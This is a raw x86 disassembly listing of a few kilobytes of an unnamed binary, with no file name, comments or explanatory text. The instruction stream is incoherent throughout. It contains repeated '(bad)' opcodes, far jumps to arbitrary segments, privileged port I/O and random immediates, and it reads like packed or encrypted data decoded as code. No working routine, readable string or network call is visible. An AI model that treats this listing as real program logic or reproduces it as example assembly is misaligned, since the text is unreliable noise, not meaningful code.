  4169da:	mov    bl,0xe0
  4169dc:	cdq    
  4169dd:	shl    bh,1
  4169df:	jp     0x416992
  4169e1:	mov    ds:0x45e584ea,eax
  4169e6:	div    BYTE PTR [ecx-0x5248bbf1]
  4169ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ed:	dec    BYTE PTR [esi+eiz*4-0x7cda5e7d]
  4169f4:	mov    dh,0xed
  4169f6:	push   edx
  4169f7:	pop    es
  4169f8:	jmp    0x5a70:0xdb75f840
  4169ff:	push   0x46ed55e1
  416a04:	fistp  DWORD PTR [edi+0x14]
  416a07:	or     BYTE PTR [edi-0x4c],ch
  416a0a:	mov    bh,0x86
  416a0c:	push   ebp
  416a0d:	add    eax,0x36a6b6a2
  416a12:	xor    dl,dl
  416a14:	push   ss
  416a15:	retf   0x2b6d
  416a18:	stos   DWORD PTR es:[edi],eax
  416a19:	push   ebx
  416a1a:	pop    ebx
  416a1b:	xchg   edx,eax
  416a1c:	push   cs
  416a1d:	mov    esi,0x5b68127f
  416a22:	fsub   DWORD PTR [eax+0x30d332b0]
  416a28:	cmp    edi,esp
  416a2a:	add    esp,ebx
  416a2c:	fdivr  DWORD PTR [edx+0x59f5d989]
  416a32:	xchg   esi,eax
  416a33:	inc    esi
  416a34:	fs mov edx,0x625d0b6d
  416a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a3b:	dec    ecx
  416a3c:	stos   DWORD PTR es:[edi],eax
  416a3d:	sti    
  416a3e:	into   
  416a3f:	push   cs
  416a40:	mov    DWORD PTR [esi+0x5a],edi
  416a43:	popa   
  416a44:	fistp  DWORD PTR [esi+0x298c0424]
  416a4a:	xor    dl,BYTE PTR [ebx+0x55]
  416a4d:	inc    esi
  416a4e:	push   ss
  416a4f:	mov    edx,0xbf8a36d0
  416a54:	sbb    eax,0x2e46761
  416a59:	xchg   edx,eax
  416a5a:	lods   eax,DWORD PTR ds:[esi]
  416a5b:	mov    ds:0xea85b6a,eax
  416a60:	leave  
  416a61:	jnp    0x416a7b
  416a63:	inc    esp
  416a64:	adc    eax,0xaad55db5
  416a69:	xchg   edi,eax
  416a6a:	pop    edi
  416a6b:	ja     0x416ae4
  416a6d:	enter  0x7454,0x44
  416a71:	ins    BYTE PTR es:[edi],dx
  416a72:	es in  al,0x40
  416a75:	cwde   
  416a76:	pop    ebx
  416a77:	pop    ebx
  416a78:	mov    eax,0x4fb549f0
  416a7d:	push   eax
  416a7e:	fidiv  DWORD PTR [edx+0x185f4de7]
  416a84:	lea    eax,[ebp-0x2a3d7f52]
  416a8a:	push   cs
  416a8b:	icebp  
  416a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a8d:	ss imul ebx,ebx,0xffffffc2
  416a91:	test   esi,ebp
  416a93:	hlt    
  416a94:	int3   
  416a95:	retf   
  416a96:	loop   0x416acc
  416a98:	cmc    
  416a99:	mov    dh,0xc2
  416a9b:	push   eax
  416a9c:	mov    bh,bl
  416a9e:	jbe    0x416b0b
  416aa0:	rol    DWORD PTR [ecx],0xf9
  416aa3:	scas   eax,DWORD PTR es:[edi]
  416aa4:	sbb    ch,0xb3
  416aa7:	push   0xffffffde
  416aa9:	mov    DWORD PTR [esi-0x185f653],esi
  416aaf:	enter  0x3e74,0x84
  416ab3:	jnp    0x416a90
  416ab5:	jmp    0x8b37:0x3086088
  416abc:	mov    eax,ds:0x85b61638
  416ac1:	jbe    0x416a53
  416ac3:	into   
  416ac4:	stos   BYTE PTR es:[edi],al
  416ac5:	(bad)  
  416ac6:	cdq    
  416ac7:	sbb    DWORD PTR [ecx-0x225c5c48],0xffffff96
  416ace:	push   ss
  416acf:	mov    BYTE PTR [edi-0x33d0e83e],dh
  416ad5:	mov    edx,0x13600f32
  416ada:	shr    BYTE PTR [ebp+0x35],0x8f
  416ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416adf:	xor    edx,DWORD PTR [eax-0x57]
  416ae2:	call   0x9e4d074
  416ae7:	and    esp,DWORD PTR [edx]
  416ae9:	pop    ebp
  416aea:	cmp    DWORD PTR [edi+0x75],edi
  416aed:	(bad)  
  416aee:	push   esp
  416aef:	lds    ebp,FWORD PTR [ebp-0x2e860228]
  416af5:	hlt    
  416af6:	pop    eax
  416af7:	xor    eax,0xd2d2c6c2
  416afc:	mov    edx,0xc4c52d29
  416b01:	mov    cl,0xe2
  416b03:	pop    es
  416b04:	outs   dx,BYTE PTR ds:[esi]
  416b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b06:	ret    0xdbc5
  416b09:	test   al,0x3d
  416b0b:	fnsave [edx]
  416b0d:	cli    
  416b0e:	mov    al,0x15
  416b10:	mov    cl,0xd1
  416b12:	push   esi
  416b13:	sub    eax,0xc20d327d
  416b18:	rcl    dh,cl
  416b1a:	inc    ecx
  416b1b:	ins    DWORD PTR es:[edi],dx
  416b1c:	xchg   edx,eax
  416b1d:	mov    dh,0x2c
  416b1f:	dec    ebp
  416b20:	call   0x6f1a0de6
  416b25:	fistp  DWORD PTR [esi+0x23]
  416b28:	js     0x416ba7
  416b2a:	int    0x28
  416b2c:	pop    edi
  416b2d:	jg     0x416b85
  416b2f:	inc    ecx
  416b30:	sub    ebx,DWORD PTR [edx+0x468acd00]
  416b36:	push   ebp
  416b37:	fmul   QWORD PTR [edx]
  416b39:	fcmovnb st,st(7)
  416b3b:	pop    esp
  416b3c:	enter  0x9b4f,0xfe
  416b40:	jae    0x416b56
  416b42:	sub    eax,0x809cdadf
  416b47:	loop   0x416af8
  416b49:	xor    DWORD PTR [eax],eax
  416b4b:	mov    ebp,0xaa3aa466
  416b50:	mov    eax,0xd8ed29d1
  416b55:	sub    ebp,DWORD PTR [edi]
  416b57:	gs mov ecx,0xd8d85b69
  416b5d:	sahf   
  416b5e:	jg     0x416b32
  416b60:	jmp    0x8b50:0x6708e3af
  416b67:	sbb    eax,0xbe066175
  416b6c:	jmp    FWORD PTR [edx]
  416b6e:	lahf   
  416b6f:	dec    ebp
  416b70:	xlat   BYTE PTR ds:[ebx]
  416b71:	inc    ebp
  416b72:	jmp    0x416b14
  416b74:	ss call 0x74d6a970
  416b7a:	rcl    DWORD PTR [esi+0x46],1
  416b7d:	adc    esi,DWORD PTR [ecx+0x7f3b4d70]
  416b83:	xchg   ebp,eax
  416b84:	out    dx,eax
  416b85:	push   ss
  416b86:	in     al,0x50
  416b88:	ins    BYTE PTR es:[edi],dx
  416b89:	mov    ds:0xeffeceed,al
  416b8e:	arpl   bx,si
  416b90:	pop    esi
  416b91:	sbb    BYTE PTR [ecx-0x3c8b92fa],cl
  416b97:	je     0x416b32
  416b99:	sbb    dl,BYTE PTR [ecx-0x3924fb96]
  416b9f:	ins    DWORD PTR es:[edi],dx
  416ba0:	pop    edx
  416ba1:	add    al,bh
  416ba3:	lock shl BYTE PTR [esi],0xaa
  416ba7:	int3   
  416ba8:	fdivr  QWORD PTR [edx+0x4d440d88]
  416bae:	stos   BYTE PTR es:[edi],al
  416baf:	or     al,BYTE PTR [ecx+ebx*2-0x2b]
  416bb3:	in     al,dx
  416bb4:	ins    DWORD PTR es:[edi],dx
  416bb5:	mov    ah,0xd
  416bb7:	adc    eax,0xe057049e
  416bbc:	js     0x416bfa
  416bbe:	push   es
  416bbf:	and    BYTE PTR [esi],ch
  416bc1:	mov    cl,0x2
  416bc3:	pushf  
  416bc4:	(bad)  
  416bc5:	push   ebp
  416bc6:	jnp    0x416b7a
  416bc8:	mov    BYTE PTR [ebx+0x17],bl
  416bcb:	rcr    BYTE PTR [edx+0x509e7afc],1
  416bd1:	(bad)  
  416bd3:	ficom  DWORD PTR [esi-0x7f5944f6]
  416bd9:	call   esi
  416bdb:	and    al,bh
  416bdd:	fiadd  DWORD PTR [edi-0x4a]
  416be0:	test   DWORD PTR [esi+0x3af982dd],esi
  416be6:	ret    0xddcd
  416be9:	or     eax,0xd60dc88e
  416bee:	inc    eax
  416bef:	ins    BYTE PTR es:[edi],dx
  416bf0:	fcomp  QWORD PTR [ebp+ebp*8+0x68]
  416bf4:	cdq    
  416bf5:	xlat   BYTE PTR ds:[ebx]
  416bf6:	pop    ebx
  416bf7:	scas   eax,DWORD PTR es:[edi]
  416bf8:	aam    0x1b
  416bfa:	jmp    0xe2fa:0x5e78c2c2
  416c01:	aas    
  416c02:	sub    DWORD PTR [ebx-0x3b],eax
  416c05:	nop
  416c06:	pop    ebx
  416c07:	sbb    ecx,DWORD PTR ds:0x1ef66b11
  416c0d:	gs pop es
  416c0f:	mov    cl,0xdd
  416c11:	sbb    ch,BYTE PTR [eax]
  416c13:	mov    dh,0x12
  416c15:	das    
  416c16:	cwde   
  416c17:	std    
  416c18:	adc    BYTE PTR [edx-0x4],ah
  416c1b:	xor    edi,DWORD PTR [ebx-0x764faf2f]
  416c21:	into   
  416c22:	and    eax,0x2d3a3c0c
  416c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c28:	or     esi,DWORD PTR [edi-0x707e97fa]
  416c2e:	mov    ch,0x9b
  416c30:	jno    0x416c3e
  416c32:	mov    al,ds:0xad8dc52e
  416c37:	ins    DWORD PTR es:[edi],dx
  416c38:	lds    ecx,FWORD PTR [esi+0x3688aa89]
  416c3e:	sub    DWORD PTR [esi-0x13],ebp
  416c41:	(bad)  
  416c42:	inc    esi
  416c43:	push   edi
  416c44:	add    ecx,DWORD PTR [esi-0x67]
  416c47:	loope  0x416bcb
  416c49:	jmp    0x416c9c
  416c4b:	fwait
  416c4c:	push   ss
  416c4d:	cmp    ch,BYTE PTR [eax-0x210bd4a]
  416c53:	in     eax,0x67
  416c55:	les    ebx,FWORD PTR [ebx]
  416c57:	and    DWORD PTR [eax-0x57],ebp
  416c5a:	fucom  st(3)
  416c5c:	ins    BYTE PTR es:[edi],dx
  416c5d:	jae    0x416cc1
  416c5f:	mov    ecx,0x61129768
  416c64:	mov    BYTE PTR [ebx+0xb],bl
  416c67:	inc    ebp
  416c68:	cwde   
  416c69:	dec    esi
  416c6a:	push   ebx
  416c6b:	or     ecx,DWORD PTR [ebx+0x0]
  416c6e:	fstp   TBYTE PTR [eax]
  416c70:	push   cs
  416c71:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  416c73:	jo     0x416c82
  416c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c76:	adc    eax,0x7440352e
  416c7b:	mov    ebx,0x3d455c05
  416c80:	and    eax,0xc2b116da
  416c85:	les    ecx,FWORD PTR [eax-0x54534923]
  416c8b:	ins    DWORD PTR es:[edi],dx
  416c8c:	(bad)  
  416c8e:	jnp    0x416c8a
  416c90:	pop    ecx
  416c91:	sahf   
  416c92:	std    
  416c93:	mov    ah,BYTE PTR [edi+esi*1]
  416c96:	mov    ecx,0xb0a37170
  416c9b:	jo     0x416cff
  416c9d:	sbb    eax,0x75d6f7f4
  416ca2:	xor    al,0x23
  416ca4:	lods   eax,DWORD PTR ds:[esi]
  416ca5:	imul   eax,DWORD PTR [bx],0x8c24139f
  416cac:	clc    
  416cad:	inc    edx
  416cae:	push   0xffffffb5
  416cb0:	mov    al,ds:0x7a3db76d
  416cb5:	add    DWORD PTR [ebp+0x2f],ebp
  416cb8:	mov    esi,0xdb5be5b9
  416cbd:	mov    dh,0xb5
  416cbf:	adc    DWORD PTR [edi+ebx*1+0x49],ecx
  416cc3:	mov    ecx,0x31bb5c58
  416cc8:	xchg   edx,eax
  416cc9:	lods   eax,DWORD PTR ds:[esi]
  416cca:	mov    cl,0x23
  416ccc:	sbb    BYTE PTR [ebx],0x12
  416ccf:	(bad)  
  416cd0:	adc    eax,DWORD PTR [ebp+eax*1-0x7a77d49e]
  416cd7:	repnz or bl,BYTE PTR [esi+0x2c004e4b]
  416cde:	ins    BYTE PTR es:[edi],dx
  416cdf:	sbb    BYTE PTR [ebx-0x50],0x5e
  416ce3:	lods   al,BYTE PTR ds:[esi]
  416ce4:	push   ss
  416ce5:	ins    DWORD PTR es:[edi],dx
  416ce6:	test   DWORD PTR [ebp-0x25],ebp
  416ce9:	mov    ebp,0x9af854ca
  416cee:	add    eax,0x69e99d4c
  416cf3:	add    ch,ch
  416cf5:	or     BYTE PTR [eax-0x46827cad],bh
  416cfb:	lock pop ecx
  416cfd:	xor    eax,0x2f3b7010
  416d02:	data16 fstp DWORD PTR gs:[ebp-0x25a4a4d3]
  416d0a:	xor    DWORD PTR cs:[edx],0xffffffd3
  416d0e:	inc    esp
  416d0f:	mov    ecx,0x5800f65
  416d14:	fadd   DWORD PTR [edx+0x4822ead]
  416d1a:	ret    0x164
  416d1d:	ja     0x416d34
  416d1f:	mov    cl,0x0
  416d21:	or     eax,0xdc4ba6fd
  416d26:	sbb    al,BYTE PTR [eax-0x3cc44f28]
  416d2c:	mov    ds,esp
  416d2e:	sub    esi,esi
  416d30:	in     eax,dx
  416d31:	frstor [eax-0x5e35d3d4]
  416d37:	pop    ds
  416d38:	xchg   BYTE PTR [esi-0x17fe1a73],bl
  416d3e:	push   0x97fa14a1
  416d43:	addr16 clc 
  416d45:	push   ds
  416d46:	(bad)  
  416d47:	push   esp
  416d48:	fld    TBYTE PTR [ebp+0x2a952c41]
  416d4e:	fcmove st,st(6)
  416d50:	and    BYTE PTR [edx+0x6e945008],cl
  416d56:	fist   DWORD PTR [edi+ebx*2-0x4c]
  416d5a:	pop    DWORD PTR [ebx]
  416d5c:	mov    ds:0xb5b6c571,al
  416d61:	mov    ds:0xede936e7,al
  416d66:	lods   eax,DWORD PTR ds:[esi]
  416d67:	push   esp
  416d68:	fimul  DWORD PTR [ebp+0x741241ad]
  416d6e:	mov    ds:0xf8294e84,eax
  416d73:	push   0xb3dd783b
  416d78:	pop    ebx
  416d79:	push   ebp
  416d7a:	test   edi,ebp
  416d7c:	sbb    al,0xae
  416d7e:	out    dx,eax
  416d7f:	pop    edx
  416d80:	add    BYTE PTR [esi],dl
  416d82:	push   ss
  416d83:	jle    0x416d18
  416d85:	icebp  
  416d86:	xchg   BYTE PTR [ebx],bl
  416d88:	int3   
  416d89:	push   0xdb9edb6b
  416d8e:	out    dx,al
  416d8f:	sbb    eax,0x97f36523
  416d94:	push   ebp
  416d95:	lods   eax,DWORD PTR ds:[esi]
  416d96:	push   ebp
  416d97:	ins    BYTE PTR es:[edi],dx
  416d98:	and    eax,0x9997b684
  416d9d:	pop    ecx
  416d9e:	ins    DWORD PTR es:[edi],dx
  416d9f:	or     ecx,DWORD PTR ds:0x8a911bc5
  416da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416da6:	dec    ecx
  416da7:	mov    edx,0xadb7a4a7
  416dac:	push   eax
  416dad:	mov    ah,0xc8
  416daf:	cmp    eax,0x770a2c0e
  416db4:	push   esi
  416db5:	xor    eax,0x517616f
  416dba:	cmp    DWORD PTR [ebx],ebx
  416dbc:	dec    ebp
  416dbd:	or     eax,0x55418f1e
  416dc2:	add    dl,bl
  416dc4:	stos   BYTE PTR es:[edi],al
  416dc5:	push   es
  416dc6:	sbb    cl,bh
  416dc8:	mov    ebx,0x460cd82a
  416dcd:	mov    edi,0x78104a3b
  416dd2:	ss push ss
  416dd4:	push   ss
  416dd5:	sbb    bl,BYTE PTR [ebp+ebx*4+0x3feb70ca]
  416ddc:	mov    ds:0x80582a68,al
  416de1:	lds    esi,FWORD PTR [ebp+0x5ad1c8d7]
  416de7:	popa   
  416de8:	fstp   TBYTE PTR [ecx]
  416dea:	fld    QWORD PTR [esi+0x2675e255]
  416df0:	add    DWORD PTR [esi],ebp
  416df2:	ins    BYTE PTR es:[edi],dx
  416df3:	mov    ah,0x21
  416df5:	cmp    ebx,ebp
  416df7:	pop    edi
  416df8:	mov    eax,0x5282e5cc
  416dfd:	fild   DWORD PTR [eax]
  416dff:	mov    cl,0xd6
  416e01:	pop    ss
  416e02:	push   ecx
  416e03:	ins    DWORD PTR es:[edi],dx
  416e04:	cs pop ss
  416e06:	inc    esp
  416e07:	mov    eax,0xe7db6db0
  416e0c:	je     0x416e4a
  416e0e:	ret    0xa859
  416e11:	out    0x37,al
  416e13:	sbb    bh,bl
  416e15:	adc    al,0xdc
  416e17:	retf   0xe417
  416e1a:	xor    al,BYTE PTR [eax]
  416e1c:	lahf   
  416e1d:	lahf   
  416e1e:	lods   eax,DWORD PTR ds:[esi]
  416e1f:	loop   0x416db3
  416e21:	test   BYTE PTR [ecx+0x1270360d],0x56
  416e28:	inc    ecx
  416e29:	push   edi
  416e2a:	nop
  416e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e2c:	adc    al,0xb9
  416e2e:	cs xchg esp,eax
  416e30:	sbb    dl,0xa6
  416e33:	in     al,dx
  416e34:	or     BYTE PTR [ecx+0x52],bh
  416e37:	xor    DWORD PTR [eax-0x5a77124e],eax
  416e3d:	dec    ebp
  416e3e:	sub    eax,0xba8a840b
  416e43:	or     BYTE PTR [ebp+0x78d17029],0x71
  416e4a:	imul   eax,DWORD PTR [esp+edx*4-0x67],0xfffffff4
  416e4f:	es mov edi,0x76281b60
  416e55:	push   eax
  416e56:	sbb    BYTE PTR [esi],dl
  416e58:	(bad)  
  416e59:	pop    ebx
  416e5a:	lods   al,BYTE PTR ds:[esi]
  416e5b:	mov    eax,0x68dd4476
  416e60:	mov    WORD PTR [ebx-0x59],?
  416e63:	in     eax,dx
  416e64:	jecxz  0x416eda
  416e66:	or     edi,DWORD PTR [ebx]
  416e68:	stos   BYTE PTR es:[edi],al
  416e69:	mov    eax,0xe9807315
  416e6e:	xchg   BYTE PTR [eax+0x3d],dl
  416e71:	cmp    ah,al
  416e73:	inc    edx
  416e74:	add    eax,DWORD PTR [ecx]
  416e76:	push   0xffffff9b
  416e78:	add    al,0xaf
  416e7a:	mov    cl,0xdb
  416e7c:	push   ecx
  416e7d:	ror    BYTE PTR [esi+0x297c2ce8],0xb3
  416e84:	cmp    BYTE PTR [ecx+0x52e208ed],ch
  416e8a:	pop    ecx
  416e8b:	arpl   WORD PTR [ecx+0x77],bp
  416e8e:	stos   DWORD PTR es:[edi],eax
  416e8f:	rcr    DWORD PTR [edx+0x4314762a],1
  416e95:	jb     0x416eaf
  416e97:	adc    BYTE PTR [ebx+ebp*4],ch
  416e9a:	mov    al,BYTE PTR [ebp-0x3280762a]
  416ea0:	jl     0x416f17
  416ea2:	inc    esi
  416ea3:	mov    DWORD PTR [esi+0x845b9b6],esi
  416ea9:	ficomp DWORD PTR [edx+0x11dbbd8d]
  416eaf:	mov    al,0xfc
  416eb1:	push   esp
  416eb2:	add    BYTE PTR es:0xee38f21a,ch
  416eb9:	repz out dx,eax
  416ebb:	fcmovnu st,st(2)
  416ebd:	push   0xd8c3ae54
  416ec2:	mov    ebx,0x6da2bcf1
  416ec7:	imul   esp,DWORD PTR [ecx-0x55],0x56296e97
  416ece:	sub    DWORD PTR [ecx-0x6a44bd2a],edi
  416ed4:	out    0x1d,al
  416ed6:	adc    DWORD PTR [edi],esi
  416ed8:	sub    DWORD PTR [eax],0xffffff8e
  416edb:	std    
  416edc:	shl    BYTE PTR [ebp+0x3080ea2e],0x93
  416ee3:	sar    BYTE PTR [ebx],cl
  416ee5:	pusha  
  416ee6:	cs push esi
  416ee8:	push   esp
  416ee9:	mov    ebx,0x11476975
  416eee:	(bad)  
  416ef0:	enter  0x1da2,0x5
  416ef4:	(bad)  
  416ef6:	jg     0x416e8a
  416ef8:	das    
  416ef9:	outs   dx,DWORD PTR ss:[esi]
  416efb:	(bad)  
  416efc:	das    
  416efd:	dec    esi
  416efe:	mov    cl,0x5
  416f00:	mov    ch,0x11
  416f02:	ds mov bl,0x4c
  416f05:	neg    ebx
  416f07:	lods   eax,DWORD PTR ds:[esi]
  416f08:	ins    DWORD PTR es:[edi],dx
  416f09:	fadd   QWORD PTR [edx]
  416f0b:	in     eax,dx
  416f0c:	cmp    DWORD PTR [ecx+0x27],ebp
  416f0f:	mov    esp,0x1434fcd7
  416f14:	cmc    
  416f15:	imul   edi,DWORD PTR [ebx+0x786700d4],0xffffffec
  416f1c:	ins    BYTE PTR es:[edi],dx
  416f1d:	jb     0x416f24
  416f1f:	push   es
  416f20:	pop    esi
  416f21:	imul   ebx,ebx,0x6d
  416f24:	jecxz  0x416f9c
  416f26:	pop    edx
  416f27:	jge    0x416f79
  416f29:	inc    ecx
  416f2a:	push   ss
  416f2b:	cmp    edi,eax
  416f2d:	jge    0x416f1e
  416f2f:	sub    BYTE PTR [esi],dh
  416f31:	stos   BYTE PTR es:[edi],al
  416f32:	ins    DWORD PTR es:[edi],dx
  416f33:	fnstsw WORD PTR [ecx+ecx*4-0x76aa39de]
  416f3a:	mov    dh,0x26
  416f3c:	and    eax,0x7b31a12d
  416f41:	push   esp
  416f42:	sub    eax,0x3b3a6b68
  416f47:	fdivr  DWORD PTR [eax]
  416f49:	mov    ds:0xdd0ad85d,eax
  416f4e:	xor    ecx,DWORD PTR gs:[edx]
  416f51:	pop    ebx
  416f52:	mov    edi,0xdd6fd226
  416f57:	push   0x75082369
  416f5c:	cmp    dl,BYTE PTR [ecx+0x952e12]
  416f62:	sbb    edi,DWORD PTR [ebx-0x53d3d393]
  416f68:	cmp    BYTE PTR [esi+0x54],0x3e
  416f6c:	cmc    
  416f6d:	fsubr  DWORD PTR [ebp-0x65]
  416f70:	fisttp QWORD PTR [edx+0x5b]
  416f73:	push   ebx
  416f74:	sub    BYTE PTR [esi-0x2b55344a],0x34
  416f7b:	hlt    
  416f7c:	push   ss
  416f7d:	fimul  DWORD PTR [ebp-0x3c34fa53]
  416f83:	sbb    ebp,DWORD PTR [ebp-0x12]
  416f86:	das    
  416f87:	popa   
  416f88:	cmp    al,0x41
  416f8a:	sbb    edx,0xffffff96
  416f8d:	sub    al,0xf3
  416f8f:	sub    al,0x15
  416f91:	inc    edi
  416f92:	loop   0x416fe6
  416f94:	or     ebp,DWORD PTR [eax-0x2a]
  416f97:	daa    
  416f98:	imul   eax,DWORD PTR [esi+0x6adb61b8],0xa
  416f9f:	(bad)  
  416fa0:	fcomp  QWORD PTR [ebx+0x55]
  416fa3:	ja     0x417012
  416fa5:	jg     0x416f82
  416fa7:	fiadd  DWORD PTR [ebp-0x72b89693]
  416fad:	popf   
  416fae:	(bad)  
  416fb0:	lods   eax,DWORD PTR ds:[esi]
  416fb1:	lds    eax,FWORD PTR [esi]
  416fb3:	mov    esp,0x61616374
  416fb8:	inc    edx
  416fb9:	push   0x65
  416fbb:	mov    dl,0x67
  416fbd:	sbb    al,al
  416fbf:	aam    0x6e
  416fc1:	ins    DWORD PTR es:[edi],dx
  416fc2:	xor    al,0x50
  416fc4:	sbb    bh,BYTE PTR [edi]
  416fc6:	aad    0xfa
  416fc8:	push   0xfffffff8
  416fca:	pop    esp
  416fcb:	pop    ss
  416fcc:	shr    DWORD PTR [esi+0x74816480],0x6b
  416fd3:	ins    DWORD PTR es:[edi],dx
  416fd4:	test   al,0xdb
  416fd6:	inc    esi
  416fd7:	or     al,0xc3
  416fd9:	sbb    BYTE PTR [ebx+0x5d8536d4],bl
  416fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fe0:	push   ebp
  416fe1:	jo     0x416f64
  416fe3:	lods   eax,DWORD PTR ds:[esi]
  416fe4:	pop    esp
  416fe5:	bound  ecx,QWORD PTR [ecx-0x4fd313e5]
  416feb:	mov    al,0xb0
  416fed:	xor    eax,0x6a73878
  416ff2:	fcomp  QWORD PTR [eax+0x6daba631]
  416ff8:	sub    BYTE PTR [esi],0xf0
  416ffb:	leave  
  416ffc:	arpl   WORD PTR [edi],bp
  416ffe:	cmp    ebx,DWORD PTR [edi]
  417000:	sbb    al,cl
  417002:	mov    edx,0x7f6342aa
  417007:	out    0x5,eax
  417009:	das    
  41700a:	das    
  41700b:	clc    
  41700c:	je     0x416fe9
  41700e:	push   ss
  41700f:	rol    edi,cl
  417011:	es jle 0x417025
  417014:	xchg   edi,eax
  417015:	pushf  
  417016:	and    BYTE PTR [esi],cl
  417018:	sbb    al,0x26
  41701a:	loop   0x417072
  41701c:	pop    ebx
  41701d:	push   ss
  41701e:	sti    
  41701f:	into   
  417020:	rol    DWORD PTR [ebp-0x67],cl
  417023:	inc    esp
  417024:	push   esi
  417025:	or     ch,BYTE PTR [eax-0x49]
  417028:	ss pop esp
  41702a:	xchg   BYTE PTR [eax],bl
  41702c:	sbb    eax,0x2886cb79
  417031:	mov    dh,0xdb
  417033:	nop
  417034:	fdiv   DWORD PTR ds:[edx]
  417037:	sbb    bl,BYTE PTR [esi+0x8]
  41703a:	adc    ebx,esp
  41703c:	mov    dh,0x85
  41703e:	fcomp  QWORD PTR [edx+edi*4]
  417041:	mov    al,0xe1
  417043:	or     BYTE PTR [ecx],al
  417045:	loop   0x41709a
  417047:	mov    dh,0xa9
  417049:	sbb    BYTE PTR [ebx-0x14],0x71
  41704d:	punpckhdq mm0,mm7
  417050:	add    eax,DWORD PTR [edi+0x56]
  417053:	je     0x417059
  417055:	fcmovnbe st,st(2)
  417057:	xchg   ebx,eax
  417058:	fnstsw WORD PTR [eax*8-0x1239fe83]
  41705f:	ret    0x6db6
  417062:	(bad)  
  417063:	mov    al,0xdd
  417065:	mov    ch,0xef
  417067:	cmp    al,0xa0
  417069:	scas   al,BYTE PTR es:[edi]
  41706a:	stc    
  41706b:	add    BYTE PTR [esp+ebp*2+0xb],0x1b
  417070:	xchg   DWORD PTR [esi-0x21eb84f6],ebx
  417076:	jbe    0x41708d
  417078:	mov    cl,0xb0
  41707a:	or     BYTE PTR [eax],0x73
  41707d:	cmp    BYTE PTR [ebp+0x75b0e0ff],dh
  417083:	in     eax,0x2a
  417085:	xor    ebx,DWORD PTR ds:0xbbed0eca
  41708b:	mov    ch,0x50
  41708d:	fld    TBYTE PTR cs:[esi+0x61]
  417091:	push   0xffffffeb
  417093:	test   esi,esi
  417095:	popf   
  417096:	out    dx,eax
  417097:	pop    eax
  417098:	push   0x4e0060a0
  41709d:	and    DWORD PTR [edi-0x56],0x5db6dadd
  4170a4:	sbb    DWORD PTR ds:0x56ee9815,edx
  4170aa:	jg     0x41702f
  4170ac:	pop    ecx
  4170ad:	push   esi
  4170ae:	test   DWORD PTR [ebx+eax*1-0x2c],eax
  4170b2:	mov    dh,0x50
  4170b4:	test   eax,0xa60163e3
  4170b9:	fisubr DWORD PTR [ebp+0x2b]
  4170bc:	mov    edi,0xc8d667
  4170c1:	fmul   QWORD PTR [edx]
  4170c3:	mov    WORD PTR [edi+eiz*4+0xd],?
  4170c7:	lock mov al,0x40
  4170ca:	test   eax,0xc0efdc28
  4170cf:	pop    edi
  4170d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170d1:	push   0x5f
  4170d3:	fstp   st(2)
  4170d5:	inc    edx
  4170d6:	nop
  4170d7:	jns    0x417135
  4170d9:	adc    DWORD PTR [eax],ebp
  4170db:	inc    edx
  4170dc:	out    0xe4,al
  4170de:	adc    DWORD PTR [edi+0x47c8400a],edx
  4170e4:	pop    esp
  4170e5:	sub    esp,ebx
  4170e7:	mov    dh,0x15
  4170e9:	ss stos BYTE PTR es:[edi],al
  4170eb:	cmp    eax,0x811ad081
  4170f0:	das    
  4170f1:	lods   al,BYTE PTR ds:[esi]
  4170f2:	ret    0x2a87
  4170f5:	mov    dh,0xed
  4170f7:	push   esi
  4170f8:	pop    esi
  4170f9:	fisttp QWORD PTR [ecx-0x44]
  4170fc:	mov    ds:0xdb80248c,al
  417101:	push   ss
  417102:	mov    ecx,0x8504775
  417107:	xchg   ebx,eax
  417108:	inc    esi
  417109:	fcom   DWORD PTR [ecx]
  41710b:	ror    DWORD PTR [esi+0x35d4194d],1
  417111:	mov    ebp,0xadadc445
  417116:	or     DWORD PTR [edx-0x54],edx
  417119:	inc    ecx
  41711a:	cmp    al,0xe8
  41711c:	xor    BYTE PTR [ebx+0x0],ah
  41711f:	loopne 0x4170f7
  417121:	inc    esp
  417122:	outs   dx,DWORD PTR ds:[esi]
  417123:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417125:	jecxz  0x417110
  417127:	outs   dx,BYTE PTR ds:[esi]
  417128:	dec    ebx
  417129:	je     0x41718f
  41712b:	imul   esp,DWORD PTR [edx],0xe207f56
  417131:	div    BYTE PTR gs:[esi+0x3bd0b506]
  417138:	dec    edi
  417139:	cdq    
  41713a:	xor    eax,0x2e800eb4
  41713f:	adc    al,0x2a
  417141:	cmp    DWORD PTR [eax+0x2a],ebx
  417144:	sbb    edx,0x5fa685ad
  41714a:	xchg   DWORD PTR [esi+0x40d049c8],esp
  417150:	mov    WORD PTR [edi-0x2e23beb3],fs
  417156:	(bad)  
  417157:	push   esp
  417158:	(bad)  
  417159:	mov    al,0xa7
  41715b:	les    edx,FWORD PTR ds:[edx+0x17]
  41715f:	lds    esi,FWORD PTR [ecx]
  417161:	sbb    bl,BYTE PTR [ebp-0x3e73b58a]
  417167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417168:	rcl    BYTE PTR [esi-0x7d],cl
  41716b:	imul   edi,DWORD PTR [ecx-0x55863a7d],0x63
  417172:	rcl    DWORD PTR [esp+ecx*8+0x2e],1
  417176:	sbb    bl,bl
  417178:	imul   esp,DWORD PTR cs:[ecx-0x7f],0xe
  41717d:	cmp    bl,ah
  41717f:	xchg   ebx,eax
  417180:	mov    esp,0x8bd61d1f
  417185:	push   0x46e66b61
  41718a:	dec    edi
  41718b:	dec    esp
  41718c:	in     al,dx
  41718d:	or     ecx,ebp
  41718f:	ret    0x56d2
  417192:	cmp    bh,ch
  417194:	sbb    dh,dh
  417196:	inc    esi
  417197:	shl    DWORD PTR [edi+0x2c],cl
